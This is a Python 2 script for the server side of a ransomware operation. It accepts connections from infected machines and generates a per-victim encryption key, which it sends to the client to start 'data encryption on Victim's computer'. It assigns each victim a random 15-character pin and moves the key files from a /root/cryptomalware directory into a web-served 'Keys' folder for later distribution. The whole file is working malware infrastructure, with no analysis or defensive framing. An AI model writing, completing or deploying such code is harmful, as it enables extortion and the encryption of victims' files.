#!/usr/bin/python
#this Server will only run on a linux environment
import os 
import socket
import thread
import sys
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet

def keygen(passwd, name):
    
    password = passwd.encode()
    salt = b'\x82k\x19r%j\xe6\xf6\xda\x94&h9\xfd\xba\x0c' 
    kdf = PBKDF2HMAC(
	    algorithm=hashes.SHA256(),
	    length=32,
	    salt=salt,
	    iterations = 1000000,
	    backend=default_backend()
    )
    key = base64.urlsafe_b64encode(kdf.derive(password))

    global auth_pin
    auth_pin = key_authpass()
    file = open(auth_pin+".key" , "wb")
    file.write(key)
    file.close()

    return key

def key_authpass():

	import random 
	import string 
	
	passcombo = string.ascii_uppercase+string.digits+string.ascii_lowercase
	otp = ''.join(random.choice(passcombo) for _ in range(15)) 

	return otp 


def key_transfer():
	os.chdir("/root/cryptomalware")
	os.system("mv ???????????????.key /var/www/html/Keys")




def EchoClientHandler(clientSocket, addr) :
	while 1:
		client_data  = clientSocket.recv(2048)
		if client_data :
			print client_data			
			clientSocket.send(client_data)
			password = Fernet.generate_key()
			print "password is: " + password
			secret = keygen(password, addr[0])
			print "key is: " + secret
			print "Victim's 15 digit pin is : " + auth_pin 

			clientSocket.send(secret)
			
			print clientSocket.recv(2048)
			print "Data encryption started on Victim's computer..."
			print "Transffering the private key containing file of the Current victim to the local server directory ..."

			key_transfer()
			print "Transffered the key file to the distribution server"
			#print "encrypting started"
			clientSocket.close()
			break
		else :
			clientSocket.close()
			return



echoServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

echoServer.bind((sys.argv[1], int(sys.argv[2])))

echoServer.listen(10)

while 1:
	cSock, addr = echoServer.accept()
	# start a new thread to service 
	print "Starting new thread \n"
	print "receving from %s: %s "%(addr)
	thread.start_new_thread(EchoClientHandler, (cSock, addr))
	


